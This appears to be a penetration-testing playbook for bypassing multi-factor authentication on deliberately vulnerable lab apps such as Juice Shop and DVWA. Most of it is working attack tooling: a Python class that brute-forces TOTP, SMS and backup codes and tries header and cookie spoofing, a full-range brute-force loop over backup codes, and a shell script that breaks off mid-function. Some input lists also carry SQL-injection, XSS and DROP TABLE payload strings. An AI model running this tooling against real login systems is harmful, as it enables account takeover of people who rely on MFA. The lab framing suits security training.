# Playbook 09: Multi-Factor Authentication Bypass

## Objective

Test and exploit vulnerabilities in Multi-Factor Authentication (MFA) implementations across OWASP Juice Shop, DVWA, XVWA, and WebGoat to bypass second factor authentication mechanisms.

## Prerequisites

- Target applications running locally or accessible
- Python 3.x with requests, pyotp, qrcode, selenium, beautifulsoup4
- Burp Suite or similar proxy tool
- Mobile authenticator app (Google Authenticator, Authy)
- SIM card tools (for SMS testing)

## Target Applications Setup

```bash
# OWASP Juice Shop (with MFA enabled)
docker run -p 3000:3000 bkimminich/juice-shop

# DVWA (configure with MFA plugin)
docker run -p 80:80 vulnerables/web-dvwa

# XVWA (custom MFA implementation)
docker run -p 8080:80 tuxotron/xvwa

# WebGoat (MFA lessons)
docker run -p 8081:8080 webgoat/goatandwolf
```

## Manual Testing Commands

### 1. MFA Mechanism Discovery

```bash
# Discover MFA endpoints
curl -s "http://localhost:3000" | grep -i "mfa\|2fa\|totp\|sms\|authenticator"

# Check for MFA setup endpoints
curl -s "http://localhost:3000/rest/2fa/setup" -H "Authorization: Bearer TOKEN"

# Enumerate MFA methods
for method in sms email totp app backup; do
  echo "Testing $method method..."
  curl -s "http://localhost:3000/api/mfa/verify" \
    -X POST -d "method=$method&code=123456"
done
```

### 2. TOTP/Authenticator App Testing

```bash
# Extract TOTP secret from QR code endpoint
curl -s "http://localhost:3000/rest/2fa/setup" | grep -o "secret=[A-Z2-7]*"

# Test TOTP bypass with time manipulation
# (requires synchronized system time)
ntpdate -s time.nist.gov
```

### 3. SMS/Phone-based MFA Testing

```bash
# Test SMS interception endpoints
curl -s "http://localhost:3000/api/sms/send" \
  -X POST -d "phone=+1234567890"

# Check for SMS codes in response headers
curl -v "http://localhost:3000/api/sms/verify" \
  -X POST -d "phone=+1234567890&code=123456" 2>&1 | grep -i "x-debug\|x-sms"
```

### 4. Backup Code Testing

```bash
# Test backup code enumeration
for code in {000000..999999}; do
  response=$(curl -s -w "%{http_code}" "http://localhost:3000/api/mfa/backup" \
    -X POST -d "code=$code")
  if [[ "${response: -3}" == "200" ]]; then
    echo "Valid backup code: $code"
  fi
done
```

## Automated Python Scripts

### Comprehensive MFA Bypass Tester

```python
#!/usr/bin/env python3
"""
Multi-Factor Authentication Bypass Tester
Comprehensive tool for testing MFA implementation vulnerabilities
"""

import requests
import pyotp
import qrcode
import io
import base64
import time
import threading
import itertools
import json
import re
from urllib.parse import parse_qs, urlparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import random

class MFABypassTester:
    def __init__(self, target_url, app_type="juice-shop"):
        self.target_url = target_url
        self.app_type = app_type
        self.session = requests.Session()
        self.vulnerabilities = []
        self.totp_secrets = []

    def test_all_bypasses(self):
        """Run comprehensive MFA bypass tests"""
        print(f"[*] Testing MFA bypasses on {self.target_url}")

        # Authenticate to get access to MFA endpoints
        self.authenticate()

        # Test suite
        self.test_mfa_setup_vulnerabilities()
        self.test_totp_bypass()
        self.test_sms_bypass()
        self.test_backup_code_vulnerabilities()
        self.test_race_conditions()
        self.test_session_bypass()
        self.test_api_bypass()
        self.test_social_engineering_vectors()

        self.generate_report()

    def authenticate(self):
        """Authenticate to the application"""
        print("[*] Authenticating to application...")

        if self.app_type == "juice-shop":
            # Login to Juice Shop
            login_data = {
                "email": "admin@juice-sh.op",
                "password": "admin123"
            }

            response = self.session.post(
                f"{self.target_url}/rest/user/login",
                json=login_data
            )

            if response.status_code == 200:
                auth_data = response.json()
                if 'authentication' in auth_data:
                    token = auth_data['authentication']['token']
                    self.session.headers.update({
                        'Authorization': f'Bearer {token}'
                    })
                    print("[+] Authentication successful")
                    return True

        elif self.app_type == "dvwa":
            # DVWA login
            response = self.session.get(f"{self.target_url}/login.php")
            csrf_token = self.extract_csrf_token(response.text)

            login_data = {
                "username": "admin",
                "password": "password",
                "Login": "Login",
                "user_token": csrf_token
            }

            response = self.session.post(
                f"{self.target_url}/login.php",
                data=login_data
            )

            if "Welcome to Damn Vulnerable Web Application" in response.text:
                print("[+] DVWA authentication successful")
                return True

        print("[-] Authentication failed")
        return False

    def extract_csrf_token(self, html):
        """Extract CSRF token from HTML"""
        match = re.search(r'user_token["\']?\s*value["\']?\s*=\s*["\']([^"\']+)', html)
        return match.group(1) if match else ""

    def test_mfa_setup_vulnerabilities(self):
        """Test vulnerabilities in MFA setup process"""
        print("[*] Testing MFA setup vulnerabilities...")

        # Test 1: TOTP secret exposure
        self.test_totp_secret_exposure()

        # Test 2: QR code manipulation
        self.test_qr_code_manipulation()

        # Test 3: Setup bypass
        self.test_setup_bypass()

    def test_totp_secret_exposure(self):
        """Test for TOTP secret exposure"""
        setup_endpoints = [
            "/rest/2fa/setup",
            "/api/mfa/setup",
            "/mfa/qr",
            "/totp/setup",
            "/authenticator/setup"
        ]

        for endpoint in setup_endpoints:
            try:
                response = self.session.get(f"{self.target_url}{endpoint}")

                if response.status_code == 200:
                    # Look for TOTP secrets
                    secret_patterns = [
                        r'secret["\']?\s*[:=]\s*["\']?([A-Z2-7]{32})',
                        r'totpSecret["\']?\s*[:=]\s*["\']?([A-Z2-7]{32})',
                        r'otpauth://totp/[^?]*\?secret=([A-Z2-7]{32})'
                    ]

                    for pattern in secret_patterns:
                        matches = re.findall(pattern, response.text, re.IGNORECASE)
                        if matches:
                            self.totp_secrets.extend(matches)
                            self.vulnerabilities.append({
                                'type': 'TOTP Secret Exposure',
                                'severity': 'High',
                                'endpoint': endpoint,
                                'secrets': matches,
                                'description': 'TOTP secrets exposed in API response'
                            })

            except Exception as e:
                print(f"[-] Error testing {endpoint}: {e}")

    def test_qr_code_manipulation(self):
        """Test QR code manipulation vulnerabilities"""
        print("[*] Testing QR code manipulation...")

        # Try to manipulate QR code parameters
        qr_endpoints = [
            "/rest/2fa/qr",
            "/api/mfa/qr",
            "/qr/totp"
        ]

        for endpoint in qr_endpoints:
            try:
                # Test parameter manipulation
                params = {
                    'user': 'admin',
                    'secret': 'JBSWY3DPEHPK3PXP',  # Common test secret
                    'issuer': 'Test'
                }

                response = self.session.get(f"{self.target_url}{endpoint}", params=params)

                if response.status_code == 200:
                    self.vulnerabilities.append({
                        'type': 'QR Code Parameter Manipulation',
                        'severity': 'Medium',
                        'endpoint': endpoint,
                        'description': 'QR code generation accepts arbitrary parameters'
                    })

            except Exception as e:
                print(f"[-] Error testing QR manipulation: {e}")

    def test_setup_bypass(self):
        """Test MFA setup bypass"""
        print("[*] Testing MFA setup bypass...")

        # Try to skip MFA setup
        bypass_requests = [
            {'url': '/api/mfa/skip', 'method': 'POST'},
            {'url': '/rest/2fa/disable', 'method': 'POST'},
            {'url': '/mfa/bypass', 'method': 'GET'},
            {'url': '/api/user/mfa', 'method': 'DELETE'}
        ]

        for req in bypass_requests:
            try:
                if req['method'] == 'POST':
                    response = self.session.post(f"{self.target_url}{req['url']}")
                else:
                    response = self.session.get(f"{self.target_url}{req['url']}")

                if response.status_code == 200:
                    self.vulnerabilities.append({
                        'type': 'MFA Setup Bypass',
                        'severity': 'High',
                        'endpoint': req['url'],
                        'method': req['method'],
                        'description': 'MFA setup can be bypassed'
                    })

            except Exception as e:
                print(f"[-] Error testing setup bypass: {e}")

    def test_totp_bypass(self):
        """Test TOTP/Authenticator app bypass methods"""
        print("[*] Testing TOTP bypass methods...")

        # Test 1: Brute force TOTP codes
        self.test_totp_brute_force()

        # Test 2: Time window manipulation
        self.test_totp_time_manipulation()

        # Test 3: Code reuse
        self.test_totp_code_reuse()

    def test_totp_brute_force(self):
        """Test TOTP brute force protection"""
        print("[*] Testing TOTP brute force...")

        verify_endpoints = [
            "/rest/2fa/verify",
            "/api/mfa/verify",
            "/totp/verify"
        ]

        for endpoint in verify_endpoints:
            successful_codes = []

            # Try common/predictable codes first
            common_codes = ['000000', '123456', '111111', '000001', '999999']

            for code in common_codes:
                try:
                    response = self.session.post(
                        f"{self.target_url}{endpoint}",
                        json={'code': code}
                    )

                    if response.status_code == 200:
                        successful_codes.append(code)

                except Exception as e:
                    continue

            if successful_codes:
                self.vulnerabilities.append({
                    'type': 'TOTP Brute Force',
                    'severity': 'High',
                    'endpoint': endpoint,
                    'successful_codes': successful_codes,
                    'description': 'TOTP codes can be brute forced'
                })

            # Test rate limiting
            rate_limit_bypass = self.test_rate_limiting(endpoint)
            if rate_limit_bypass:
                self.vulnerabilities.append({
                    'type': 'TOTP Rate Limit Bypass',
                    'severity': 'Medium',
                    'endpoint': endpoint,
                    'description': 'TOTP verification lacks proper rate limiting'
                })

    def test_rate_limiting(self, endpoint):
        """Test rate limiting on TOTP verification"""
        request_count = 0

        for i in range(20):  # Try 20 requests quickly
            try:
                response = self.session.post(
                    f"{self.target_url}{endpoint}",
                    json={'code': f'{i:06d}'}
                )

                if response.status_code != 429:  # Not rate limited
                    request_count += 1
                else:
                    break

            except Exception as e:
                break

        return request_count > 10  # If more than 10 requests succeeded

    def test_totp_time_manipulation(self):
        """Test TOTP time window vulnerabilities"""
        print("[*] Testing TOTP time manipulation...")

        if not self.totp_secrets:
            print("[-] No TOTP secrets available for testing")
            return

        for secret in self.totp_secrets:
            try:
                # Generate codes for different time windows
                current_time = int(time.time())

                # Test codes from different time periods
                time_offsets = [-300, -60, -30, 0, 30, 60, 300]  # Seconds

                for offset in time_offsets:
                    test_time = current_time + offset
                    totp = pyotp.TOTP(secret)
                    code = totp.at(test_time)

                    # Try to verify the code
                    response = self.session.post(
                        f"{self.target_url}/rest/2fa/verify",
                        json={'code': code}
                    )

                    if response.status_code == 200 and abs(offset) > 60:
                        self.vulnerabilities.append({
                            'type': 'TOTP Time Window Too Large',
                            'severity': 'Medium',
                            'secret': secret,
                            'offset': offset,
                            'description': f'TOTP accepts codes from {abs(offset)} seconds ago/future'
                        })

            except Exception as e:
                print(f"[-] Error testing time manipulation: {e}")

    def test_totp_code_reuse(self):
        """Test TOTP code reuse vulnerabilities"""
        print("[*] Testing TOTP code reuse...")

        if not self.totp_secrets:
            return

        for secret in self.totp_secrets:
            try:
                totp = pyotp.TOTP(secret)
                current_code = totp.now()

                # Try to use the same code multiple times
                for attempt in range(3):
                    response = self.session.post(
                        f"{self.target_url}/rest/2fa/verify",
                        json={'code': current_code}
                    )

                    if response.status_code == 200 and attempt > 0:
                        self.vulnerabilities.append({
                            'type': 'TOTP Code Reuse',
                            'severity': 'Medium',
                            'secret': secret,
                            'code': current_code,
                            'description': 'TOTP codes can be reused multiple times'
                        })
                        break

            except Exception as e:
                print(f"[-] Error testing code reuse: {e}")

    def test_sms_bypass(self):
        """Test SMS-based MFA bypass methods"""
        print("[*] Testing SMS MFA bypass...")

        # Test 1: SMS interception
        self.test_sms_interception()

        # Test 2: SMS spoofing
        self.test_sms_spoofing()

        # Test 3: Phone number manipulation
        self.test_phone_number_manipulation()

    def test_sms_interception(self):
        """Test for SMS code exposure"""
        print("[*] Testing SMS interception...")

        sms_endpoints = [
            "/api/sms/send",
            "/rest/sms/verify",
            "/sms/code"
        ]

        for endpoint in sms_endpoints:
            try:
                # Request SMS code
                response = self.session.post(
                    f"{self.target_url}{endpoint}",
                    json={'phone': '+1234567890'}
                )

                # Check for code exposure in response
                code_patterns = [
                    r'code["\']?\s*[:=]\s*["\']?(\d{4,8})',
                    r'sms_code["\']?\s*[:=]\s*["\']?(\d{4,8})',
                    r'verification["\']?\s*[:=]\s*["\']?(\d{4,8})'
                ]

                for pattern in code_patterns:
                    matches = re.findall(pattern, response.text)
                    if matches:
                        self.vulnerabilities.append({
                            'type': 'SMS Code Exposure',
                            'severity': 'High',
                            'endpoint': endpoint,
                            'codes': matches,
                            'description': 'SMS verification codes exposed in API response'
                        })

                # Check response headers for debug info
                debug_headers = ['X-SMS-Code', 'X-Debug-Code', 'X-Verification']
                for header in debug_headers:
                    if header in response.headers:
                        self.vulnerabilities.append({
                            'type': 'SMS Code in Headers',
                            'severity': 'High',
                            'endpoint': endpoint,
                            'header': header,
                            'value': response.headers[header],
                            'description': 'SMS codes leaked in response headers'
                        })

            except Exception as e:
                print(f"[-] Error testing SMS interception: {e}")

    def test_sms_spoofing(self):
        """Test SMS spoofing vulnerabilities"""
        print("[*] Testing SMS spoofing...")

        # Test phone number manipulation
        phone_variations = [
            "+1234567890",
            "1234567890",
            "+1 234 567 890",
            "+1-234-567-890",
            "+1.234.567.890"
        ]

        for phone in phone_variations:
            try:
                response = self.session.post(
                    f"{self.target_url}/api/sms/send",
                    json={'phone': phone}
                )

                if response.status_code == 200:
                    # Check if all variations are accepted
                    self.vulnerabilities.append({
                        'type': 'Phone Number Format Bypass',
                        'severity': 'Low',
                        'phone': phone,
                        'description': 'Multiple phone number formats accepted'
                    })

            except Exception as e:
                continue

    def test_phone_number_manipulation(self):
        """Test phone number manipulation"""
        print("[*] Testing phone number manipulation...")

        # Test international numbers
        international_numbers = [
            "+44123456789",  # UK
            "+33123456789",  # France
            "+86123456789",  # China
            "+91123456789"   # India
        ]

        for number in international_numbers:
            try:
                response = self.session.post(
                    f"{self.target_url}/api/sms/send",
                    json={'phone': number}
                )

                if response.status_code == 200:
                    print(f"[*] International number accepted: {number}")

            except Exception as e:
                continue

    def test_backup_code_vulnerabilities(self):
        """Test backup code vulnerabilities"""
        print("[*] Testing backup code vulnerabilities...")

        # Test 1: Backup code enumeration
        self.test_backup_code_enumeration()

        # Test 2: Backup code generation flaws
        self.test_backup_code_generation()

    def test_backup_code_enumeration(self):
        """Test backup code enumeration"""
        print("[*] Testing backup code enumeration...")

        backup_endpoints = [
            "/api/mfa/backup",
            "/rest/2fa/backup",
            "/backup/verify"
        ]

        for endpoint in backup_endpoints:
            valid_codes = []

            # Test predictable backup codes
            predictable_codes = [
                '000000', '111111', '123456', '654321',
                '000001', '999999', '112233', '445566'
            ]

            for code in predictable_codes:
                try:
                    response = self.session.post(
                        f"{self.target_url}{endpoint}",
                        json={'backup_code': code}
                    )

                    if response.status_code == 200:
                        valid_codes.append(code)

                except Exception as e:
                    continue

            if valid_codes:
                self.vulnerabilities.append({
                    'type': 'Predictable Backup Codes',
                    'severity': 'High',
                    'endpoint': endpoint,
                    'codes': valid_codes,
                    'description': 'Backup codes are predictable'
                })

    def test_backup_code_generation(self):
        """Test backup code generation flaws"""
        print("[*] Testing backup code generation...")

        generation_endpoints = [
            "/api/mfa/backup/generate",
            "/rest/2fa/backup/new"
        ]

        for endpoint in generation_endpoints:
            try:
                # Request multiple sets of backup codes
                code_sets = []

                for i in range(3):
                    response = self.session.post(f"{self.target_url}{endpoint}")
                    if response.status_code == 200:
                        codes = self.extract_backup_codes(response.text)
                        if codes:
                            code_sets.append(codes)

                # Analyze for patterns
                if len(code_sets) >= 2:
                    if self.analyze_backup_code_patterns(code_sets):
                        self.vulnerabilities.append({
                            'type': 'Weak Backup Code Generation',
                            'severity': 'Medium',
                            'endpoint': endpoint,
                            'description': 'Backup codes follow predictable patterns'
                        })

            except Exception as e:
                print(f"[-] Error testing backup generation: {e}")

    def extract_backup_codes(self, response_text):
        """Extract backup codes from response"""
        # Look for backup code patterns
        patterns = [
            r'\b\d{6}\b',
            r'\b\d{8}\b',
            r'\b[A-Z0-9]{8}\b'
        ]

        for pattern in patterns:
            matches = re.findall(pattern, response_text)
            if len(matches) >= 5:  # Typical backup code count
                return matches

        return []

    def analyze_backup_code_patterns(self, code_sets):
        """Analyze backup code patterns"""
        # Simple pattern analysis
        all_codes = [code for code_set in code_sets for code in code_set]

        # Check for sequential patterns
        try:
            numeric_codes = [int(code) for code in all_codes if code.isdigit()]
            if len(numeric_codes) >= 5:
                sorted_codes = sorted(numeric_codes)
                sequential_count = 0

                for i in range(len(sorted_codes) - 1):
                    if sorted_codes[i+1] - sorted_codes[i] == 1:
                        sequential_count += 1

                if sequential_count > len(sorted_codes) * 0.3:  # 30% sequential
                    return True

        except ValueError:
            pass

        return False

    def test_race_conditions(self):
        """Test MFA race conditions"""
        print("[*] Testing race conditions...")

        # Test concurrent MFA verifications
        def verify_code(code):
            try:
                response = self.session.post(
                    f"{self.target_url}/rest/2fa/verify",
                    json={'code': code}
                )
                return response.status_code == 200
            except:
                return False

        # Launch concurrent requests with same code
        threads = []
        results = []
        test_code = "123456"

        for i in range(5):
            thread = threading.Thread(
                target=lambda: results.append(verify_code(test_code))
            )
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        success_count = sum(results)
        if success_count > 1:
            self.vulnerabilities.append({
                'type': 'MFA Race Condition',
                'severity': 'Medium',
                'success_count': success_count,
                'description': 'Same MFA code accepted multiple times concurrently'
            })

    def test_session_bypass(self):
        """Test MFA session bypass"""
        print("[*] Testing session bypass...")

        # Test if MFA can be bypassed by manipulating session
        session_bypass_tests = [
            {'header': 'X-MFA-Verified', 'value': 'true'},
            {'header': 'X-Skip-MFA', 'value': '1'},
            {'header': 'X-2FA-Bypass', 'value': 'admin'},
            {'cookie': 'mfa_verified', 'value': 'true'},
            {'cookie': 'bypass_2fa', 'value': '1'}
        ]

        for test in session_bypass_tests:
            try:
                if 'header' in test:
                    headers = {test['header']: test['value']}
                    response = self.session.get(
                        f"{self.target_url}/profile",
                        headers=headers
                    )
                elif 'cookie' in test:
                    cookies = {test['cookie']: test['value']}
                    response = self.session.get(
                        f"{self.target_url}/profile",
                        cookies=cookies
                    )

                if response.status_code == 200 and "profile" in response.text.lower():
                    self.vulnerabilities.append({
                        'type': 'MFA Session Bypass',
                        'severity': 'High',
                        'method': test,
                        'description': 'MFA can be bypassed using session manipulation'
                    })

            except Exception as e:
                print(f"[-] Error testing session bypass: {e}")

    def test_api_bypass(self):
        """Test MFA API bypass"""
        print("[*] Testing API bypass...")

        # Test direct API access without MFA
        protected_endpoints = [
            "/api/user/profile",
            "/rest/user/data",
            "/api/admin/users",
            "/rest/admin/settings"
        ]

        for endpoint in protected_endpoints:
            try:
                # Try without MFA verification
                response = self.session.get(f"{self.target_url}{endpoint}")

                if response.status_code == 200:
                    self.vulnerabilities.append({
                        'type': 'API MFA Bypass',
                        'severity': 'High',
                        'endpoint': endpoint,
                        'description': 'Protected API accessible without MFA verification'
                    })

            except Exception as e:
                continue

    def test_social_engineering_vectors(self):
        """Test social engineering attack vectors"""
        print("[*] Testing social engineering vectors...")

        # Test if MFA setup can be reset easily
        reset_endpoints = [
            "/api/mfa/reset",
            "/rest/2fa/disable",
            "/mfa/emergency-disable"
        ]

        for endpoint in reset_endpoints:
            try:
                response = self.session.post(f"{self.target_url}{endpoint}")

                if response.status_code == 200:
                    self.vulnerabilities.append({
                        'type': 'Easy MFA Reset',
                        'severity': 'Medium',
                        'endpoint': endpoint,
                        'description': 'MFA can be easily reset/disabled'
                    })

            except Exception as e:
                continue

    def generate_report(self):
        """Generate comprehensive vulnerability report"""
        print("\n" + "="*70)
        print("MULTI-FACTOR AUTHENTICATION BYPASS REPORT")
        print("="*70)

        if not self.vulnerabilities:
            print("[+] No MFA bypass vulnerabilities found")
            return

        # Group vulnerabilities by severity
        high_risk = [v for v in self.vulnerabilities if v['severity'] == 'High']
        medium_risk = [v for v in self.vulnerabilities if v['severity'] == 'Medium']
        low_risk = [v for v in self.vulnerabilities if v['severity'] == 'Low']

        if high_risk:
            print(f"\n🔴 HIGH RISK VULNERABILITIES ({len(high_risk)}):")
            for vuln in high_risk:
                print(f"   [!] {vuln['type']}")
                print(f"       {vuln['description']}")

        if medium_risk:
            print(f"\n🟡 MEDIUM RISK VULNERABILITIES ({len(medium_risk)}):")
            for vuln in medium_risk:
                print(f"   [*] {vuln['type']}")
                print(f"       {vuln['description']}")

        if low_risk:
            print(f"\n🟢 LOW RISK VULNERABILITIES ({len(low_risk)}):")
            for vuln in low_risk:
                print(f"   [-] {vuln['type']}")
                print(f"       {vuln['description']}")

        print(f"\n[*] Total vulnerabilities: {len(self.vulnerabilities)}")

        # Risk assessment
        risk_score = len(high_risk) * 3 + len(medium_risk) * 2 + len(low_risk) * 1
        if risk_score >= 10:
            print("🔴 OVERALL RISK: CRITICAL")
        elif risk_score >= 6:
            print("🟡 OVERALL RISK: HIGH")
        elif risk_score >= 3:
            print("🟠 OVERALL RISK: MEDIUM")
        else:
            print("🟢 OVERALL RISK: LOW")

class MFAAutomationTools:
    """Additional automation tools for MFA testing"""

    @staticmethod
    def generate_totp_codes(secret, time_window=30, count=10):
        """Generate TOTP codes for different time periods"""
        totp = pyotp.TOTP(secret)
        current_time = int(time.time())
        codes = []

        for i in range(-count//2, count//2 + 1):
            test_time = current_time + (i * time_window)
            code = totp.at(test_time)
            codes.append({
                'time_offset': i * time_window,
                'code': code,
                'timestamp': test_time
            })

        return codes

    @staticmethod
    def parse_qr_code_from_url(qr_url):
        """Parse TOTP parameters from QR code URL"""
        try:
            # Extract otpauth URL from QR code
            # This is a simplified version - real implementation would decode QR image
            if 'otpauth://totp/' in qr_url:
                parsed = urlparse(qr_url)
                params = parse_qs(parsed.query)

                return {
                    'secret': params.get('secret', [None])[0],
                    'issuer': params.get('issuer', [None])[0],
                    'algorithm': params.get('algorithm', ['SHA1'])[0],
                    'digits': int(params.get('digits', [6])[0]),
                    'period': int(params.get('period', [30])[0])
                }
        except Exception as e:
            print(f"[-] Error parsing QR code: {e}")

        return None

    @staticmethod
    def bruteforce_sms_code(target_url, phone_number, code_length=6):
        """Brute force SMS verification codes"""
        session = requests.Session()

        # Generate all possible codes
        max_code = 10 ** code_length

        for code_num in range(max_code):
            code = f"{code_num:0{code_length}d}"

            try:
                response = session.post(
                    f"{target_url}/api/sms/verify",
                    json={
                        'phone': phone_number,
                        'code': code
                    }
                )

                if response.status_code == 200:
                    print(f"[+] Valid SMS code found: {code}")
                    return code

            except Exception as e:
                continue

        return None

if __name__ == "__main__":
    # Test specific application
    tester = MFABypassTester("http://localhost:3000", "juice-shop")
    tester.test_all_bypasses()

    # Generate TOTP codes for testing
    # secret = "JBSWY3DPEHPK3PXP"  # Example secret
    # codes = MFAAutomationTools.generate_totp_codes(secret)
    # print(f"Generated codes: {codes}")
```

### SMS Interception Tool

```python
#!/usr/bin/env python3
"""
SMS Interception and Analysis Tool
Tools for testing SMS-based MFA vulnerabilities
"""

import requests
import re
import time
import json
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

class SMSInterceptor:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.intercepted_codes = []

    def setup_browser(self):
        """Setup headless browser for web-based SMS testing"""
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")

        self.driver = webdriver.Chrome(options=chrome_options)
        return self.driver

    def test_sms_endpoints(self):
        """Test various SMS-related endpoints for code leakage"""
        endpoints = [
            "/api/sms/send",
            "/rest/sms/request",
            "/sms/generate",
            "/auth/sms",
            "/verify/sms"
        ]

        test_phones = [
            "+1234567890",
            "1234567890",
            "+1-234-567-8900",
            "admin"  # Test for parameter injection
        ]

        for endpoint in endpoints:
            print(f"[*] Testing endpoint: {endpoint}")

            for phone in test_phones:
                try:
                    # POST request
                    response = self.session.post(
                        f"{self.target_url}{endpoint}",
                        json={"phone": phone}
                    )

                    self.analyze_sms_response(response, endpoint, phone)

                    # GET request with parameters
                    response = self.session.get(
                        f"{self.target_url}{endpoint}",
                        params={"phone": phone}
                    )

                    self.analyze_sms_response(response, endpoint, phone)

                except Exception as e:
                    print(f"[-] Error testing {endpoint} with {phone}: {e}")

    def analyze_sms_response(self, response, endpoint, phone):
        """Analyze response for SMS code leakage"""
        # Check status code
        if response.status_code not in [200, 201, 202]:
            return

        # Look for SMS codes in response body
        sms_patterns = [
            r'\b\d{4}\b',      # 4-digit codes
            r'\b\d{5}\b',      # 5-digit codes
            r'\b\d{6}\b',      # 6-digit codes
            r'\b\d{7}\b',      # 7-digit codes
            r'\b\d{8}\b',      # 8-digit codes
            r'code["\']?\s*[:=]\s*["\']?(\d{4,8})',
            r'sms["\']?\s*[:=]\s*["\']?(\d{4,8})',
            r'verification["\']?\s*[:=]\s*["\']?(\d{4,8})'
        ]

        for pattern in sms_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                print(f"[!] SMS code found in {endpoint}: {matches}")
                self.intercepted_codes.extend(matches)

        # Check response headers
        suspicious_headers = [
            'X-SMS-Code', 'X-Debug-SMS', 'X-Verification-Code',
            'X-Debug', 'X-Test-Code', 'X-SMS-Debug'
        ]

        for header in suspicious_headers:
            if header in response.headers:
                value = response.headers[header]
                if re.match(r'\d{4,8}', value):
                    print(f"[!] SMS code in header {header}: {value}")
                    self.intercepted_codes.append(value)

    def test_sms_timing_attack(self):
        """Test timing-based SMS attacks"""
        print("[*] Testing SMS timing attacks...")

        # Send SMS and measure response times
        phone = "+1234567890"
        response_times = []

        for i in range(10):
            start_time = time.time()

            try:
                response = self.session.post(
                    f"{self.target_url}/api/sms/send",
                    json={"phone": phone}
                )

                end_time = time.time()
                response_time = end_time - start_time
                response_times.append(response_time)

                print(f"Response {i+1}: {response_time:.3f}s")

            except Exception as e:
                print(f"[-] Error in timing test {i+1}: {e}")

            time.sleep(1)

        # Analyze timing patterns
        if response_times:
            avg_time = sum(response_times) / len(response_times)
            print(f"[*] Average response time: {avg_time:.3f}s")

            # Look for significant variations
            variations = [abs(t - avg_time) for t in response_times]
            max_variation = max(variations)

            if max_variation > avg_time * 0.5:  # 50% variation
                print(f"[!] Significant timing variation detected: {max_variation:.3f}s")

    def test_sms_rate_limiting(self):
        """Test SMS rate limiting"""
        print("[*] Testing SMS rate limiting...")

        phone = "+1234567890"
        success_count = 0

        for i in range(20):
            try:
                response = self.session.post(
                    f"{self.target_url}/api/sms/send",
                    json={"phone": phone}
                )

                if response.status_code in [200, 201, 202]:
                    success_count += 1
                elif response.status_code == 429:
                    print(f"[*] Rate limited after {i+1} requests")
                    break

            except Exception as e:
                print(f"[-] Error in rate limit test {i+1}: {e}")
                break

        print(f"[*] {success_count} SMS requests succeeded before rate limiting")

        if success_count > 5:
            print("[!] Weak or no SMS rate limiting detected")

    def test_phone_number_validation(self):
        """Test phone number validation bypasses"""
        print("[*] Testing phone number validation...")

        test_numbers = [
            "+1234567890",           # Standard format
            "1234567890",            # No country code
            "+1 234 567 8900",       # Spaces
            "+1-234-567-8900",       # Hyphens
            "+1.234.567.8900",       # Dots
            "+1(234)567-8900",       # Parentheses
            "12345678901234567890",  # Too long
            "123",                   # Too short
            "admin",                 # Non-numeric
            "+1' OR '1'='1",         # SQL injection attempt
            "+1<script>alert(1)</script>",  # XSS attempt
            "+1234567890; DROP TABLE users;",  # Command injection
        ]

        for number in test_numbers:
            try:
                response = self.session.post(
                    f"{self.target_url}/api/sms/send",
                    json={"phone": number}
                )

                if response.status_code in [200, 201, 202]:
                    print(f"[*] Accepted phone number: {number}")

                    # Check for injection responses
                    if "error" in response.text.lower() or "exception" in response.text.lower():
                        print(f"[!] Potential injection vulnerability with: {number}")

            except Exception as e:
                continue

    def intercept_sms_via_browser(self, phone_number):
        """Use browser automation to intercept SMS codes"""
        print(f"[*] Setting up browser-based SMS interception for {phone_number}...")

        driver = self.setup_browser()

        try:
            # Navigate to application
            driver.get(self.target_url)

            # Look for SMS-related elements
            sms_elements = driver.find_elements(By.XPATH,
                "//*[contains(text(), 'SMS') or contains(text(), 'code') or contains(text(), 'verification')]")

            for element in sms_elements:
                print(f"[*] Found SMS element: {element.text}")

            # Monitor network requests (simplified)
            logs = driver.get_log('performance')
            for log in logs:
                message = json.loads(log['message'])
                if 'Network.responseReceived' in message['message']['method']:
                    url = message['message']['params']['response']['url']
                    if 'sms' in url.lower() or 'code' in url.lower():
                        print(f"[*] SMS-related network request: {url}")

        except Exception as e:
            print(f"[-] Browser interception error: {e}")

        finally:
            driver.quit()

    def generate_report(self):
        """Generate SMS interception report"""
        print("\n" + "="*50)
        print("SMS INTERCEPTION REPORT")
        print("="*50)

        if self.intercepted_codes:
            print(f"[!] Intercepted SMS codes: {self.intercepted_codes}")
            print(f"[!] Total codes intercepted: {len(self.intercepted_codes)}")
        else:
            print("[+] No SMS codes intercepted")

        print("[*] SMS interception testing complete")

if __name__ == "__main__":
    interceptor = SMSInterceptor("http://localhost:3000")

    interceptor.test_sms_endpoints()
    interceptor.test_sms_timing_attack()
    interceptor.test_sms_rate_limiting()
    interceptor.test_phone_number_validation()

    interceptor.generate_report()
```

## Shell Scripts

### MFA Bypass Testing Script

```bash
#!/bin/bash
# Multi-Factor Authentication Bypass Testing Script

TARGET_APPS=("http://localhost:3000" "http://localhost:80" "http://localhost:8080" "http://localhost:8081")
APP_NAMES=("Juice-Shop" "DVWA" "XVWA" "WebGoat")

echo "=== Multi-Factor Authentication Bypass Testing ==="
echo "Testing ${#TARGET_APPS[@]} applications..."

# Function to test TOTP bypass
test_totp_bypass() {
    local url=$1
    local app_name=$2

    echo "[*] Testing TOTP bypass for $app_name..."

    # Test common TOTP codes
    common_codes=("000000" "123456" "111111" "000001" "999999")

    for code in "${common_codes[@]}"; do
        response=$(curl -s -w "%{http_code}" -X POST "$url/api/2fa/verify" \
            -H "Content-Type: application/json" \
            -d "{\"code\":\"$code\"}")

        http_code="${response: -3}"
        if [[ "$http_code" == "200" ]]; then
            echo "[!] Valid TOTP code found: $code"
        fi
    done
}

# Function to test SMS bypass
test_sms_bypass() {
    local url=$1
    local app_name=$2

    echo "[*] Testing SMS bypass for $app_name..."

    # Test SMS code exposure
    response=$(curl -s -v -X POST "$url/api/sms/send" \
        -H "Content-Type: application/json" \
        -d '{"phone":"+1234567890"}' 2>&1)

    # Check for codes in response
    if echo "$response" | grep -oE '\b[0-9]{4,8}\b' > /dev/null; then
        echo "[!] SMS code potentially exposed in response"
        echo "$response" | grep -oE '\b[0-9]{4,8}\b'
    fi

    # Check headers for debug information
